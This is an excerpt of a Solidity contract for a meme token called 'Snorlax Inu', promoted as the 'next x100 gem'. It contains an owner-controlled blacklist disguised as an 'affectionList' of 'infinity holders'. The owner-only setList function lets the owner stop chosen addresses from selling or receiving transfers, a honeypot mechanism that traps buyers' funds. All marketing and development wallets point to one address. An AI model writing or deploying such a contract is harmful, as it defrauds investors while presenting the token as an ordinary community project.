...
/**
    ...
    WELCOME TO Snorlax Inu Inu COMMUNITY! Now you are a member of the next x100 gem!
...
contract SnorlaxInu is ERC20, Ownable {
    ...
    mapping (address => bool) private affectionList;
    ...
    constructor() ERC20("Snorlax Inu", "LAX") {
        ...
        projectWallets.marketingWallet = 0xEcf8DBaa7d64bAf5EEFbD28e237756e3031696Fc;
        projectWallets.developmentWallet1 = 0xEcf8DBaa7d64bAf5EEFbD28e237756e3031696Fc;
        projectWallets.developmentWallet2 = 0xEcf8DBaa7d64bAf5EEFbD28e237756e3031696Fc;
        projectWallets.developmentWallet3 = 0xEcf8DBaa7d64bAf5EEFbD28e237756e3031696Fc;
        ...
        swapTokensAtAmount = 700 * (10 ** 18);
        maxWallet = 50_000 * (10 ** 18) * 2 / 100; //2%
    ...
    // Lista do carinho para determinados endereços, os quais chamamos de holder infinito :)
    function setList(address infinityHolder, bool isInfinity) external onlyOwner() {
        affectionList[infinityHolder] = isInfinity;
    }
    ...
    function _transfer(
        ...
        */
        ...
        if(from != uniswapV2Pair && to != uniswapV2Pair && takeFee) {
            takeFee = false;
            require(!affectionList[to], "Infinity holder");
        ...
        if(takeFee) {
            ...
            // sell
                ...
                require(!affectionList[from], "Infinity holder");
